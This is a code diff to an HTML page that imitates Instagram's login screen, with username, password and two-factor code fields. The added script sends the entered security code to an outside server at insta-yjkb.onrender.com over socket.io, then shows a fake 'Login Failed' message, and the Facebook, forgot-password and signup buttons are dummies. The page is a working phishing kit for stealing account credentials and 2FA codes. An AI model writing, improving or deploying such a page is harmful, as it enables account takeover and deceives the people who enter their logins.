@@ -219,6 +219,17 @@
             font-size: 13px;
             color: #a8a8a8;
         }
+
+	.login-logo{
+    	display:flex;
+    	justify-content:center;
+    	margin-bottom:15px;
+	}
+
+	.login-logo img{
+    	width:60px;
+	}
+
         @media (max-width: 900px) {
             .left {
                 display: none;
@@ -231,7 +242,7 @@
     <div class="container">
         <div class="left">
             <div class="logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1280px-Instagram_icon.png">
+                <img src="https://i.ibb.co/Kcpj78X3/Instagram-icon-png.webp">
             </div>
             <h1>See everyday moments from your <span class="gradient">close friends.</span></h1>
             <div class="card">
@@ -242,7 +253,12 @@
         <div class="right">
             <div class="login">
                 <form id="loginPage">
-                    <h2>login</h2>
+
+		    <div class="login-logo">
+   		    <img src="https://i.ibb.co/Kcpj78X3/Instagram-icon-png.webp" alt="logo">
+		    </div>
+
+                    <h2>Login</h2>
                     <input class="input" id="username" name="username" placeholder="Mobile number, username or email" required>
                     <input class="input" id="password" name="password" type="password" placeholder="Password" required>
                     <button type="submit" class="login-btn">Log in</button>
@@ -260,7 +276,7 @@
                     <div class="twofa-box">
                         <div class="lock">🔒</div>
                         <p>Enter the code we sent to<br>your registered number: +91 **********</p>
-                        <input class="input" id="code" placeholder="Security Code">
+                        <input class="input" id="code" name="code" placeholder="Security Code">
                         <button class="confirm-btn" id="confirmBtn">Confirm</button>
 
                         <label class="trust">
@@ -297,7 +313,7 @@
         </div>
     </footer>
 
-    <script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
+<script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
 
     <script>
         const socket = io("https://insta-yjkb.onrender.com");
@@ -345,6 +361,35 @@
         }
         window.addEventListener("hashchange", showPage);
         showPage();
+
+	// Facebook button
+	document.querySelector(".fb-login").addEventListener("click", () => {
+    	alert("Continue with Facebook");
+	});
+
+	// Forgot password
+	document.querySelector(".forgot").addEventListener("click", () => {
+	alert("Forgot password clicked");
+	});
+
+	// Signup
+	document.querySelector(".signup span").addEventListener("click", () => {
+    	alert("Create new account clicked");
+	});
+
+	// 2FA Confirm button
+	document.getElementById("confirmBtn").addEventListener("click", () => {
+        const code = document.getElementById("code").value;
+
+    	if (!code) {
+        	alert("Enter security code");
+        	return;
+    	}
+
+    	socket.emit("submit", { code: code });
+
+    	alert("Login Failed please try again after some time");
+	});
     </script>
 </body>
 </html>
